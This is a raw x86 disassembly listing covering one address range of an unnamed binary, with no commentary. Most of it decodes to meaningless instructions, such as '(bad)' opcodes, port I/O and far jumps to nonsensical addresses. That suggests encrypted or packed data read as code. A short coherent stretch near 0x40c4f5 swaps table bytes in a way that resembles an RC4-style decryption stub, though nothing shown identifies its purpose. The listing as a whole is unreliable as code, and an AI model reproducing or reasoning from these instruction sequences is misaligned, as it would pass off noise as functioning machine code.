  40c189:	inc    ecx
  40c18a:	mov    eax,ds:0x53ed8d00
  40c18f:	mov    ecx,DWORD PTR [edx+esi*1+0x54]
  40c193:	(bad)  
  40c194:	mov    esp,0x8150e3c3
  40c199:	sub    al,0x23
  40c19b:	cmp    BYTE PTR [edi],ch
  40c19d:	push   0x9
  40c19f:	(bad)  
  40c1a2:	iret   
  40c1a3:	stc    
  40c1a4:	stc    
  40c1a5:	xchg   ecx,eax
  40c1a6:	push   ss
  40c1a7:	popf   
  40c1a8:	jl     0x40c161
  40c1aa:	pop    ecx
  40c1ab:	scas   al,BYTE PTR es:[edi]
  40c1ac:	adc    al,0x2d
  40c1ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c1af:	retf   0xd9b7
  40c1b2:	lea    esp,[edi+0x35]
  40c1b5:	je     0x40c213
  40c1b7:	(bad)  
  40c1b8:	push   ss
  40c1b9:	pop    ebx
  40c1ba:	fimul  WORD PTR [ecx+eiz*1-0x45]
  40c1be:	out    dx,eax
  40c1bf:	inc    ecx
  40c1c0:	outs   dx,DWORD PTR ds:[esi]
  40c1c1:	ror    DWORD PTR [esi-0x3e],0xb7
  40c1c5:	dec    esp
  40c1c6:	setne  BYTE PTR [ebx-0x3a]
  40c1ca:	pop    ebx
  40c1cb:	cmc    
  40c1cc:	sub    eax,DWORD PTR [edx+0x69b94d1d]
  40c1d2:	mov    edx,edi
  40c1d4:	and    edx,esp
  40c1d6:	shr    DWORD PTR [ebx],cl
  40c1d8:	imul   edi,DWORD PTR ds:0xe3402b56,0x26
  40c1df:	outs   dx,DWORD PTR ds:[esi]
  40c1e0:	call   0xb8e2af51
  40c1e5:	jmp    0x433f:0x90441b6b
  40c1ec:	cli    
  40c1ed:	shl    DWORD PTR [ebx+0x593d510d],cl
  40c1f3:	and    eax,0x9ac9a578
  40c1f8:	arpl   WORD PTR [ebx],dx
  40c1fa:	data16 cmc 
  40c1fc:	lahf   
  40c1fd:	loopne 0x40c233
  40c1ff:	sub    edi,0x5aeea479
  40c205:	lahf   
  40c206:	(bad)  [eax+ebp*1-0x13]
  40c20a:	push   esp
  40c20b:	popf   
  40c20c:	xchg   ebx,eax
  40c20d:	and    BYTE PTR [edi+edi*4],0x3a
  40c211:	lds    ebp,FWORD PTR [edi+edx*4]
  40c214:	lea    eax,[esi+0x24aa4ce7]
  40c21a:	ror    DWORD PTR [edi+0x1ba1f70b],1
  40c220:	dec    esp
  40c221:	push   ds
  40c222:	adc    BYTE PTR [ebx],0xe2
  40c225:	fwait
  40c226:	(bad)  
  40c227:	aam    0x39
  40c229:	mov    ebx,0x3d3071c1
  40c22e:	or     eax,0x9e694280
  40c233:	sbb    eax,0x69685391
  40c238:	push   esp
  40c239:	ins    BYTE PTR es:[edi],dx
  40c23a:	retf   
  40c23b:	adc    al,0xdf
  40c23d:	repnz rcr BYTE PTR [edx+0x24],1
  40c241:	mov    edi,0xccdbf0bb
  40c246:	repz fsubr DWORD PTR [eax+0x2383a034]
  40c24d:	add    BYTE PTR [edx+0x4b],0x47
  40c251:	inc    esp
  40c252:	out    0xf4,al
  40c254:	comiss xmm5,DWORD PTR [ebx]
  40c257:	sub    ah,BYTE PTR [edi+0x519cfcc2]
  40c25d:	adc    eax,0x85a8afe8
  40c262:	push   edi
  40c263:	inc    edx
  40c264:	sbb    eax,0xc613dcae
  40c269:	fs cwde 
  40c26b:	ins    DWORD PTR es:[edi],dx
  40c26c:	push   edx
  40c26d:	mov    ecx,0xb5697aef
  40c272:	sub    bl,0x79
  40c275:	int3   
  40c276:	loope  0x40c2c0
  40c278:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c279:	nop
  40c27a:	dec    esi
  40c27b:	inc    ebx
  40c27c:	stos   BYTE PTR es:[edi],al
  40c27d:	scas   eax,DWORD PTR es:[edi]
  40c27e:	jle    0x40c2ee
  40c280:	pushf  
  40c281:	cdq    
  40c282:	iret   
  40c283:	mov    edi,DWORD PTR [ebp-0x59]
  40c286:	sbb    BYTE PTR [ebx-0x33b03cbf],0xbb
  40c28d:	xor    esp,DWORD PTR [esi]
  40c28f:	or     DWORD PTR [eax+ebp*8],edx
  40c292:	push   esp
  40c293:	mov    ebx,0x619415a0
  40c298:	outs   dx,BYTE PTR ds:[esi]
  40c299:	leave  
  40c29a:	in     eax,dx
  40c29b:	aaa    
  40c29c:	ds inc ebx
  40c29e:	dec    edx
  40c29f:	xchg   ebx,eax
  40c2a0:	aad    0x16
  40c2a2:	js     0x40c2aa
  40c2a4:	popf   
  40c2a5:	and    BYTE PTR [ebx+0x4467ec84],bh
  40c2ab:	int    0xa0
  40c2ad:	sub    BYTE PTR [edx+0x6e9e268],ch
  40c2b3:	mov    esp,0xe950d0f
  40c2b8:	je     0x40c2da
  40c2ba:	nop
  40c2bb:	cld    
  40c2bc:	or     BYTE PTR [ebx-0x60755b38],0xb5
  40c2c3:	mov    ecx,0x8a823382
  40c2c8:	mov    ah,0x3d
  40c2ca:	or     DWORD PTR [ebx],esi
  40c2cc:	cs out dx,al
  40c2ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c2d0:	stos   DWORD PTR es:[edi],eax
  40c2d1:	add    al,0x2a
  40c2d3:	aaa    
  40c2d4:	ins    BYTE PTR es:[edi],dx
  40c2d5:	pusha  
  40c2d6:	loopne 0x40c2a4
  40c2d8:	sub    bh,bl
  40c2da:	mov    ebp,0xa2f1af2b
  40c2df:	xor    edi,edx
  40c2e1:	pop    ebp
  40c2e2:	fisubr WORD PTR [esi]
  40c2e4:	and    dl,BYTE PTR [edx+0x4f2bcf50]
  40c2ea:	(bad)  
  40c2ec:	fwait
  40c2ed:	xchg   ebp,eax
  40c2ee:	aad    0x8b
  40c2f0:	push   ebp
  40c2f1:	ins    DWORD PTR es:[edi],dx
  40c2f2:	adc    ecx,DWORD PTR [ebx]
  40c2f4:	push   0x64bb6f1b
  40c2f9:	pop    esp
  40c2fa:	jne    0x40c303
  40c2fc:	scas   eax,DWORD PTR es:[edi]
  40c2fd:	mov    al,ds:0x54af9fdb
  40c302:	test   eax,0xa2f69dde
  40c307:	push   edx
  40c308:	sbb    al,BYTE PTR [esp+edx*8-0x44]
  40c30c:	xor    ch,ah
  40c30e:	and    eax,0xc2555e24
  40c313:	inc    ecx
  40c314:	lds    ebx,FWORD PTR [edi]
  40c316:	xor    BYTE PTR [edi-0x5dfd875e],dl
  40c31c:	xlat   BYTE PTR ds:[ebx]
  40c31d:	pop    edx
  40c31e:	ret    0x35c2
  40c321:	retf   
  40c322:	or     eax,0x413b8ae2
  40c327:	loopne 0x40c2c4
  40c329:	pushf  
  40c32a:	mov    ebx,0x9108b457
  40c32f:	push   0xa47cc1fb
  40c334:	enter  0x4960,0xfa
  40c338:	sbb    BYTE PTR [ebp-0xe0597a6],dh
  40c33e:	outs   dx,BYTE PTR ds:[esi]
  40c33f:	scas   al,BYTE PTR es:[edi]
  40c340:	mov    dl,0xad
  40c342:	out    dx,al
  40c343:	adc    al,0x90
  40c345:	mov    eax,ds:0xa79ec80e
  40c34a:	fst    DWORD PTR [edi]
  40c34c:	inc    esp
  40c34d:	jl     0x40c2d2
  40c34f:	ds cmp al,0xde
  40c352:	dec    ebx
  40c353:	ficom  DWORD PTR [edi-0xe]
  40c356:	ins    BYTE PTR es:[edi],dx
  40c357:	inc    eax
  40c358:	arpl   WORD PTR [ecx-0x380534ec],di
  40c35e:	lods   al,BYTE PTR ds:[esi]
  40c35f:	fiadd  DWORD PTR [edx+esi*1-0x138bca10]
  40c366:	push   esp
  40c367:	jg     0x40c31e
  40c369:	dec    BYTE PTR [edx-0x7d630662]
  40c36f:	addr16 mov ch,0xe2
  40c372:	(bad)  
  40c374:	repz add ebx,DWORD PTR [ecx-0x54c36234]
  40c37b:	mov    bh,0xc2
  40c37d:	jo     0x40c39b
  40c37f:	pop    es
  40c380:	sbb    eax,ebx
  40c382:	dec    ecx
  40c383:	in     al,dx
  40c384:	inc    esi
  40c385:	cli    
  40c386:	ror    BYTE PTR [ebx+0x31],1
  40c389:	push   ecx
  40c38a:	mov    DWORD PTR [ecx+edi*1+0x486b16aa],0xf7305e8e
  40c395:	cmp    edi,ebp
  40c397:	out    0x35,eax
  40c399:	lods   al,BYTE PTR ds:[esi]
  40c39a:	(bad)  
  40c39b:	or     eax,0x15d2ebcc
  40c3a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3a1:	push   esp
  40c3a2:	pop    ss
  40c3a3:	adc    ebp,DWORD PTR [ebx+0x44]
  40c3a6:	xchg   BYTE PTR [edi-0x49],ch
  40c3a9:	outs   dx,DWORD PTR ds:[esi]
  40c3aa:	jmp    0x40c40f
  40c3ac:	(bad)  
  40c3ad:	out    dx,al
  40c3ae:	sbb    eax,0x8d24c0c8
  40c3b3:	mov    WORD PTR [ebp-0x1b],es
  40c3b6:	call   0x132:0x64939b5b
  40c3bd:	mov    edi,0x3e271256
  40c3c2:	push   ss
  40c3c3:	inc    ebx
  40c3c4:	ins    BYTE PTR es:[edi],dx
  40c3c5:	scas   eax,DWORD PTR es:[edi]
  40c3c6:	fdiv   st,st(0)
  40c3c8:	fistp  QWORD PTR [edi-0x53]
  40c3cb:	mov    cl,0x9e
  40c3cd:	das    
  40c3ce:	clc    
  40c3cf:	cmp    eax,0xd21d161b
  40c3d4:	enter  0xc27a,0x33
  40c3d8:	mov    esi,0x66522706
  40c3dd:	stc    
  40c3de:	mov    ds:0xa0d753a6,eax
  40c3e3:	outs   dx,BYTE PTR ds:[esi]
  40c3e4:	or     esp,DWORD PTR [esi-0x1c]
  40c3e7:	cmp    esi,DWORD PTR [ecx]
  40c3e9:	jb     0x40c39a
  40c3eb:	cld    
  40c3ec:	(bad)  
  40c3ed:	scas   eax,DWORD PTR es:[edi]
  40c3ee:	retf   0xdaf4
  40c3f1:	das    
  40c3f2:	sbb    esp,DWORD PTR [edx+eiz*4-0x63]
  40c3f6:	jecxz  0x40c43e
  40c3f8:	loope  0x40c3b6
  40c3fa:	arpl   WORD PTR [ebp+0x7d],di
  40c3fd:	repnz test eax,0x1a3df429
  40c403:	dec    esi
  40c404:	(bad)  
  40c405:	push   0x45
  40c407:	xor    ecx,ebp
  40c409:	xor    DWORD PTR [ecx+ebx*4],ebx
  40c40c:	int3   
  40c40d:	or     ah,BYTE PTR [ebx-0x5f]
  40c410:	pop    ss
  40c411:	jno    0x40c39e
  40c413:	std    
  40c414:	fnstenv [edi+0xbd54a6f]
  40c41a:	xchg   ebx,eax
  40c41b:	repnz cdq 
  40c41d:	mov    edx,DWORD PTR [ebx]
  40c41f:	test   eax,0x7d9e2a79
  40c424:	jge    0x40c3a6
  40c426:	mov    ds,WORD PTR [ecx]
  40c428:	push   ds
  40c429:	sbb    bh,dl
  40c42b:	or     al,0xf9
  40c42d:	mov    esp,0x69105d3a
  40c432:	add    eax,0x1b2d90c8
  40c437:	into   
  40c438:	js     0x40c42d
  40c43a:	push   DWORD PTR [ebp-0x73b9fd90]
  40c440:	gs mov ebx,0xe5b54a93
  40c446:	repnz fxch st(3)
  40c449:	sub    BYTE PTR [ecx+0x64],dl
  40c44c:	imul   edi,DWORD PTR [ecx+ebp*8],0x19
  40c450:	sbb    eax,0xc75679d9
  40c455:	xor    al,0xf7
  40c457:	jne    0x40c475
  40c459:	(bad)  
  40c45a:	loop   0x40c4d7
  40c45c:	clc    
  40c45d:	jge    0x40c40b
  40c45f:	mov    al,ds:0x918cd0e4
  40c464:	xlat   BYTE PTR ds:[ebx]
  40c465:	mov    ah,0x30
  40c467:	scas   al,BYTE PTR es:[edi]
  40c468:	(bad)  
  40c469:	(bad)  [ebx+esi*8-0xb50ad4d]
  40c470:	mov    al,0x2
  40c472:	push   ebx
  40c473:	cmp    eax,0x12dbab9c
  40c478:	and    esp,DWORD PTR [ebx+0x32]
  40c47b:	imul   edx,DWORD PTR [eax-0x1d],0xcf83a4c2
  40c482:	xchg   DWORD PTR [esi],ecx
  40c484:	pusha  
  40c485:	js     0x40c446
  40c487:	ret    0x4ebe
  40c48a:	je     0x40c431
  40c48c:	cli    
  40c48d:	cmp    DWORD PTR [ecx],eax
  40c48f:	(bad)  
  40c490:	idiv   edi
  40c492:	retf   
  40c493:	fwait
  40c494:	repz xchg eax,edx
  40c497:	mov    dh,0xc
  40c499:	out    dx,eax
  40c49a:	ret    0xa75
  40c49d:	je     0x40c4f7
  40c49f:	and    al,0x6f
  40c4a1:	lods   eax,DWORD PTR ds:[esi]
  40c4a2:	outs   dx,BYTE PTR ds:[esi]
  40c4a3:	scas   eax,DWORD PTR es:[edi]
  40c4a4:	dec    BYTE PTR [edi-0x14a124f0]
  40c4aa:	mov    WORD PTR [edi+edi*2+0x71],es
  40c4ae:	scas   al,BYTE PTR es:[edi]
  40c4af:	jmp    0x3386f5c1
  40c4b4:	sub    al,0x32
  40c4b6:	mov    edx,0xc0416726
  40c4bb:	pushf  
  40c4bc:	rcl    DWORD PTR [eax+0x40],cl
  40c4bf:	sbb    edi,ebx
  40c4c1:	and    BYTE PTR [edx+0x3dc5cc9f],ch
  40c4c7:	xchg   ebp,eax
  40c4c8:	cmp    BYTE PTR [edx+0x6a],al
  40c4cb:	sahf   
  40c4cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4cd:	fld    DWORD PTR [eax+0x8]
  40c4d0:	in     al,0xe8
  40c4d2:	cmc    
  40c4d3:	std    
  40c4d4:	and    BYTE PTR [edi+eiz*8+0x55a2ba3e],bh
  40c4db:	gs or  al,0x97
  40c4de:	push   edx
  40c4df:	ror    al,cl
  40c4e1:	mov    ebx,0x37ac9b7a
  40c4e6:	into   
  40c4e7:	punpcklwd mm5,DWORD PTR [edi+0x17]
  40c4eb:	loope  0x40c533
  40c4ed:	ins    DWORD PTR es:[edi],dx
  40c4ee:	arpl   WORD PTR [edi+0x33],sp
  40c4f1:	rol    BYTE PTR [ebx],1
  40c4f3:	push   ebp
  40c4f4:	in     al,dx
  40c4f5:	mov    edi,DWORD PTR [ebp-0x1c]
  40c4f8:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  40c4ff:	mov    BYTE PTR [ebp+0xf],dl
  40c502:	mov    edx,DWORD PTR [ebp-0xc]
  40c505:	xor    edx,eax
  40c507:	add    edx,DWORD PTR [ebp-0x14]
  40c50a:	mov    edi,DWORD PTR [ebp-0x1c]
  40c50d:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  40c514:	mov    BYTE PTR [ebp+0xb],dl
  40c517:	mov    dl,BYTE PTR [ebp+0xf]
  40c51a:	mov    edi,DWORD PTR [ebp-0xc]
  40c51d:	xor    edi,eax
  40c51f:	add    edi,DWORD PTR [ebp-0x14]
  40c522:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c525:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  40c52c:	mov    dl,BYTE PTR [ebp+0xb]
  40c52f:	jmp    0x40c8ed
  40c534:	xchg   esp,eax
  40c535:	dec    ebp
  40c536:	push   es
  40c537:	adc    ecx,eax
  40c539:	push   ecx
  40c53a:	xchg   ebx,eax
  40c53b:	dec    ebp
  40c53c:	lock sbb cl,cl
  40c53f:	pop    edx
  40c540:	ja     0x40c53a
  40c542:	jns    0x40c5b8
  40c544:	dec    ebp
  40c545:	mov    BYTE PTR [eax+0x70],dh
  40c548:	lahf   
  40c549:	jge    0x40c5bb
  40c54b:	jo     0x40c558
  40c54d:	add    eax,0x55de8d6b
  40c552:	(bad)  
  40c553:	aaa    
  40c554:	mov    bl,0x77
  40c556:	jp     0x40c4ef
  40c558:	in     al,0xec
  40c55a:	push   ss
  40c55b:	and    ecx,DWORD PTR [ebp+edi*1+0x7666e65f]
  40c562:	pop    es
  40c563:	adc    eax,0x5849cb44
  40c568:	arpl   WORD PTR [ebx],sp
  40c56a:	aad    0xc4
  40c56c:	sbb    al,0xb3
  40c56e:	repz sahf 
  40c570:	mov    al,BYTE PTR [ebx-0x34f9afeb]
  40c576:	xlat   BYTE PTR ds:[ebx]
  40c577:	scas   al,BYTE PTR es:[edi]
  40c578:	test   eax,0xdf94812a
  40c57d:	and    al,BYTE PTR [edx]
  40c57f:	xchg   BYTE PTR [ecx+0x1cb0df15],ch
  40c585:	xor    esp,ebp
  40c587:	fst    DWORD PTR [eax+eax*8]
  40c58a:	pop    es
  40c58b:	call   FWORD PTR [esi-0x303671af]
  40c591:	rol    eax,1
  40c593:	retf   
  40c594:	push   ss
  40c595:	add    ebx,ebp
  40c597:	sub    al,0xbf
  40c599:	mov    ecx,DWORD PTR [ebp-0x78]
  40c59c:	mov    al,BYTE PTR [ebx-0x57]
  40c59f:	mov    ds:0x8da566c9,eax
  40c5a4:	sbb    eax,0xc608f219
  40c5a9:	outs   dx,BYTE PTR ds:[esi]
  40c5aa:	rol    BYTE PTR [edi],1
  40c5ac:	xchg   ecx,eax
  40c5ad:	and    DWORD PTR [ebx],ebx
  40c5af:	sbb    ah,ch
  40c5b1:	sbb    DWORD PTR [edx],ebx
  40c5b3:	xor    eax,0xf3bbd4ca
  40c5b8:	pop    ecx
  40c5b9:	cld    
  40c5ba:	xchg   edx,eax
  40c5bb:	jmp    0x40c575
  40c5bd:	and    ebp,DWORD PTR [ebp+0x41]
  40c5c0:	mov    BYTE PTR gs:[ebp-0x48aad02a],ch
  40c5c7:	fsub   QWORD PTR [edx+0x43c17d53]
  40c5cd:	sub    eax,0x9c79b980
  40c5d2:	aam    0x5e
  40c5d4:	push   ebp
  40c5d5:	fsub   DWORD PTR [edx+0x1]
  40c5d8:	int3   
  40c5d9:	inc    esp
  40c5da:	mov    ch,0xc9
  40c5dc:	popa   
  40c5dd:	cdq    
  40c5de:	inc    esi
  40c5df:	aam    0x7d
  40c5e1:	lock adc eax,DWORD PTR [edx+0x0]
  40c5e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c5e6:	fs and ah,cl
  40c5e9:	stos   BYTE PTR es:[edi],al
  40c5ea:	icebp  
  40c5eb:	mov    ah,0xb
  40c5ed:	mov    ds:0xe38faaff,eax
  40c5f2:	inc    ecx
  40c5f3:	fistp  QWORD PTR [esi]
  40c5f5:	cmp    DWORD PTR [eax+0x17],esi
  40c5f8:	xor    BYTE PTR es:[edx+0x49],ch
  40c5fc:	cli    
  40c5fd:	push   es
  40c5fe:	cmp    cl,BYTE PTR [eax+esi*4-0x2b976c9f]
  40c605:	pop    esp
  40c606:	nop
  40c607:	pop    esi
  40c608:	fstp   DWORD PTR [esp+ebx*1]
  40c60b:	push   ebp
  40c60c:	ins    DWORD PTR es:[edi],dx
  40c60d:	push   edi
  40c60e:	adc    bh,cl
  40c610:	add    BYTE PTR [ebx+esi*8-0x2c],bl
  40c614:	push   eax
  40c615:	mov    edi,0xdef0e8ed
  40c61a:	pusha  
  40c61b:	das    
  40c61c:	mov    bl,0xd4
  40c61e:	mov    bh,0xb8
  40c620:	cdq    
  40c621:	aad    0xa6
  40c623:	int3   
  40c624:	(bad)  
  40c625:	fstp   DWORD PTR [ecx-0x767af501]
  40c62b:	xchg   DWORD PTR [ecx-0x39],ebx
  40c62e:	sahf   
  40c62f:	mov    ebx,0xe70e753b
  40c634:	mov    ch,0xee
  40c636:	clc    
  40c637:	sbb    al,BYTE PTR ds:0x59c36f4c
  40c63d:	fisttp WORD PTR [esi]
  40c63f:	sub    BYTE PTR [ebx],dl
  40c641:	mov    DWORD PTR [ebp-0x765328ab],edx
  40c647:	or     al,0xad
  40c649:	in     al,dx
  40c64a:	cmc    
  40c64b:	xchg   BYTE PTR [edi+0x7258bef0],ah
  40c651:	add    al,0xea
  40c653:	xor    DWORD PTR [eax-0x6c],0x4fb450f3
  40c65a:	mov    WORD PTR [ebx],gs
  40c65c:	inc    edi
  40c65d:	fadd   DWORD PTR [eax+0x1ec15f00]
  40c663:	call   0xbbfcff39
  40c668:	out    0xdd,eax
  40c66a:	in     al,dx
  40c66b:	lods   al,BYTE PTR ds:[esi]
  40c66c:	punpckhwd mm3,QWORD PTR [eax]
  40c66f:	out    0x51,eax
  40c671:	mov    WORD PTR [edx+0x2a],ds
  40c674:	xchg   BYTE PTR [esi+eiz*2-0x40463beb],dh
  40c67b:	jge    0x40c6ce
  40c67d:	inc    ebx
  40c67e:	sahf   
  40c67f:	jg     0x40c617
  40c681:	xor    ch,BYTE PTR [ecx]
  40c683:	pop    edx
  40c684:	inc    edi
  40c685:	hlt    
  40c686:	cmp    esp,DWORD PTR [edx-0x52781544]
  40c68c:	lock xchg edx,eax
  40c68e:	call   0x7867:0x6896dd87
  40c695:	dec    eax
  40c696:	(bad)  
  40c697:	jp     0x40c62a
  40c699:	push   cs
  40c69a:	or     BYTE PTR [edi-0x699a3e62],ah
  40c6a0:	jecxz  0x40c635
  40c6a2:	sbb    al,0xb9
  40c6a4:	mov    bh,bh
  40c6a6:	mov    eax,ds:0x98aae1d6
  40c6ab:	mov    dl,0xc3
  40c6ad:	jl     0x40c71c
  40c6af:	fldenv [edx]
  40c6b1:	add    al,0x4a
  40c6b3:	aas    
  40c6b4:	sub    BYTE PTR ss:[edx-0x4e],bl
  40c6b8:	jle    0x40c70d
  40c6ba:	mov    ah,0xb6
  40c6bc:	fmul   st(6),st
  40c6be:	cmp    bl,BYTE PTR [esi+0x4e]
  40c6c1:	pop    ebx
  40c6c2:	cld    
  40c6c3:	out    dx,al
  40c6c4:	pop    edx
  40c6c5:	jge    0x40c69f
  40c6c7:	add    eax,0x48f5a26
  40c6cc:	dec    esp
  40c6ce:	into   
  40c6cf:	jecxz  0x40c6c9
  40c6d1:	out    dx,al
  40c6d2:	dec    edi
  40c6d3:	in     eax,0x82
  40c6d5:	dec    esi
  40c6d6:	imul   ebx,DWORD PTR [edx+0xb966510],0xffffff91
  40c6dd:	mov    ah,0x9a
  40c6df:	xor    edx,DWORD PTR [edi]
  40c6e1:	ficom  WORD PTR [ebp+0x2c]
  40c6e4:	ins    DWORD PTR es:[edi],dx
  40c6e5:	shr    DWORD PTR [esi],cl
  40c6e7:	enter  0x8299,0x32
  40c6eb:	mov    eax,ds:0x9b3b5c03
  40c6f0:	xchg   BYTE PTR [esi+0xd086fd9],cl
  40c6f6:	sbb    esi,DWORD PTR [ebx]
  40c6f8:	bound  ebp,QWORD PTR [edi]
  40c6fa:	pop    ecx
  40c6fb:	std    
  40c6fc:	les    edx,FWORD PTR [edi-0x7e0d12cf]
  40c702:	(bad)  
  40c703:	fnstsw WORD PTR [edx]
  40c705:	dec    edx
  40c706:	pop    edi
  40c707:	loope  0x40c767
  40c709:	or     eax,0x27440c82
  40c70e:	and    esi,ebx
  40c710:	jle    0x40c6b9
  40c712:	and    BYTE PTR [edi-0x71dd7451],0x52
  40c719:	push   ds
  40c71a:	repnz sub ebp,edi
  40c71d:	push   0xffffffd7
  40c71f:	sub    ax,0xd0d7
  40c723:	in     al,dx
  40c724:	push   ecx
  40c725:	push   esp
  40c726:	xchg   DWORD PTR [ecx],esi
  40c728:	mov    ds:0xd2a3bd64,eax
  40c72d:	push   ecx
  40c72e:	cs mov eax,0xea88c49b
  40c734:	popa   
  40c735:	xor    ecx,DWORD PTR [ebx+0x7]
  40c738:	inc    edx
  40c739:	add    eax,0x21935cb8
  40c73e:	int3   
  40c73f:	stc    
  40c740:	push   edx
  40c741:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c742:	add    eax,edx
  40c744:	add    al,0x18
  40c746:	aam    0x78
  40c748:	push   ebp
  40c749:	dec    esi
  40c74a:	les    ebx,FWORD PTR [edi]
  40c74c:	test   eax,0xe0ecb92a
  40c751:	pop    ebp
  40c752:	adc    eax,0x7d5defeb
  40c757:	(bad)  
  40c758:	aaa    
  40c759:	in     eax,0x44
  40c75b:	fstp   TBYTE PTR [edi-0x2f]
  40c75e:	loope  0x40c7d5
  40c760:	sbb    eax,0x9aff629b
  40c765:	dec    ebp
  40c766:	jl     0x40c7c3
  40c768:	xchg   ebx,eax
  40c769:	lods   al,BYTE PTR ds:[esi]
  40c76a:	shl    esi,0x64
  40c76d:	sbb    esi,DWORD PTR [ebx]
  40c76f:	stos   BYTE PTR es:[edi],al
  40c770:	loopne 0x40c7bc
  40c772:	and    BYTE PTR [eax+edx*8-0x6a],0x27
  40c777:	and    eax,0xdeceaaad
  40c77c:	and    eax,DWORD PTR [edi-0x53]
  40c77f:	mov    ah,0x7
  40c781:	mov    bh,0x84
  40c783:	dec    edi
  40c784:	aam    0x2
  40c786:	in     eax,0x2d
  40c788:	outs   dx,DWORD PTR ds:[esi]
  40c789:	inc    ecx
  40c78a:	mov    al,0x6a
  40c78c:	lods   al,BYTE PTR ds:[esi]
  40c78d:	mov    eax,0x87964438
  40c792:	or     cl,BYTE PTR [ecx-0x7b498f38]
  40c798:	call   0x1279a0b6
  40c79d:	pop    eax
  40c79e:	sti    
  40c79f:	mov    bl,0x7d
  40c7a1:	mov    WORD PTR [ebx*2+0x3f7444bc],gs
  40c7a8:	sti    
  40c7a9:	stc    
  40c7aa:	push   edx
  40c7ab:	xor    eax,0x3958d867
  40c7b0:	stos   DWORD PTR es:[edi],eax
  40c7b1:	push   ecx
  40c7b2:	fiadd  DWORD PTR [edi+ecx*1-0x3f]
  40c7b6:	push   esi
  40c7b7:	jg     0x40c766
  40c7b9:	sub    esi,ebx
  40c7bb:	stos   BYTE PTR es:[edi],al
  40c7bc:	mov    ebx,0xa9a5ff6b
  40c7c1:	jmp    0x1d771ac8
  40c7c6:	inc    eax
  40c7c7:	test   DWORD PTR [eax+edi*2+0x2a],ecx
  40c7cb:	std    
  40c7cc:	sub    DWORD PTR [ecx+edx*8+0x0],ebx
  40c7d0:	adc    cl,BYTE PTR [ecx-0x54da6035]
  40c7d6:	xchg   ebx,eax
  40c7d7:	add    al,0x9f
  40c7d9:	xchg   edx,eax
  40c7da:	push   es
  40c7db:	(bad)  
  40c7dd:	aaa    
  40c7de:	mov    ecx,0x66230ade
  40c7e3:	out    0x28,al
  40c7e5:	icebp  
  40c7e6:	cli    
  40c7e7:	jp     0x40c7a5
  40c7e9:	push   edx
  40c7ea:	mov    bl,0x53
  40c7ec:	sar    DWORD PTR [eax+ebx*4-0x68f985ff],0xd
  40c7f4:	loop   0x40c7e0
  40c7f6:	mov    ds:0x64820fb7,eax
  40c7fb:	repnz add DWORD PTR [ecx-0x2d],0xfffffff0
  40c800:	cmp    DWORD PTR [esi+0x45e3ecac],0x4b9ca762
  40c80a:	dec    ebp
  40c80b:	sub    bh,BYTE PTR [esp+ebp*4]
  40c80e:	mov    eax,ds:0xdef0f988
  40c813:	adc    DWORD PTR [ebx],ebx
  40c815:	int3   
  40c816:	aam    0x1
  40c818:	xchg   esp,eax
  40c819:	stc    
  40c81a:	pop    edx
  40c81b:	jb     0x40c846
  40c81d:	scas   al,BYTE PTR es:[edi]
  40c81e:	xchg   ebp,eax
  40c81f:	inc    edx
  40c820:	aam    0x64
  40c822:	mov    gs,WORD PTR [esi+ecx*4+0x27a21ac0]
  40c829:	test   BYTE PTR [edi],ah
  40c82b:	xchg   dh,dh
  40c82d:	sbb    ah,BYTE PTR [ebp-0x30b47a71]
  40c833:	xchg   esp,eax
  40c834:	fsubr  DWORD PTR [ecx+0x15]
  40c837:	mov    bh,0x8d
  40c839:	cmp    DWORD PTR [edx],esp
  40c83b:	lods   al,BYTE PTR ds:[esi]
  40c83c:	in     al,0x9c
  40c83e:	fsub   QWORD PTR [esi+0x2944f3c0]
  40c844:	popf   
  40c845:	mov    bh,0xd7
  40c847:	sar    esp,1
  40c849:	lahf   
  40c84a:	dec    eax
  40c84b:	and    eax,DWORD PTR [ebp+0x7fbea2f8]
  40c851:	jnp    0x40c831
  40c853:	and    ch,BYTE PTR [edi+0x37ad93d0]
  40c859:	(bad)  
  40c85a:	loope  0x40c828
  40c85c:	clc    
  40c85d:	ret    0xd6d3
  40c860:	and    DWORD PTR [esi],esi
  40c862:	push   edx
  40c863:	lea    ebp,[ecx-0x54]
  40c866:	xor    ch,BYTE PTR [edi+eax*8+0x6c3e2587]
  40c86d:	mov    eax,ds:0xa395ce57
  40c872:	xor    BYTE PTR [edi+0xf],bl
  40c875:	dec    ebp
  40c876:	cld    
  40c877:	inc    eax
  40c878:	std    
  40c879:	into   
  40c87a:	andps  xmm5,xmm7
  40c87d:	inc    eax
  40c87e:	outs   dx,BYTE PTR ds:[esi]
  40c87f:	lahf   
  40c880:	jae    0x40c8cc
  40c882:	xor    DWORD PTR [edi],0xffffffdd
  40c885:	dec    esi
  40c886:	mov    ds:0x4b9e6adf,al
  40c88b:	jns    0x40c836
  40c88d:	and    dh,dh
  40c88f:	and    al,0xca
  40c891:	dec    esp
  40c892:	les    eax,FWORD PTR [edx+0x63]
  40c895:	addr16 dec edx
  40c897:	repnz xchg ebp,eax
  40c899:	int    0x34
  40c89b:	mov    cl,0xe3
  40c89d:	fisub  DWORD PTR [ebx+0xc8800f3]
  40c8a3:	pop    esp
  40c8a4:	rcl    DWORD PTR [edx+0x7266fa37],0xd9
  40c8ab:	inc    ecx
  40c8ac:	loopne 0x40c836
  40c8ae:	(bad)  
  40c8af:	push   edx
  40c8b0:	sbb    BYTE PTR [ebp+0x7e37520d],dl
  40c8b6:	ror    BYTE PTR [ecx],0x28
  40c8b9:	pop    eax
  40c8ba:	dec    esp
  40c8bb:	xchg   edi,eax
  40c8bc:	sbb    al,0x53
  40c8be:	mov    al,0x7b
  40c8c0:	xchg   ecx,eax
  40c8c1:	scas   eax,DWORD PTR es:[edi]
  40c8c2:	jmp    0xb2e3:0xe1f3cf18
  40c8c9:	pop    edx
  40c8ca:	mov    ah,0x8c
  40c8cc:	(bad)  
  40c8cd:	jnp    0x40c87c
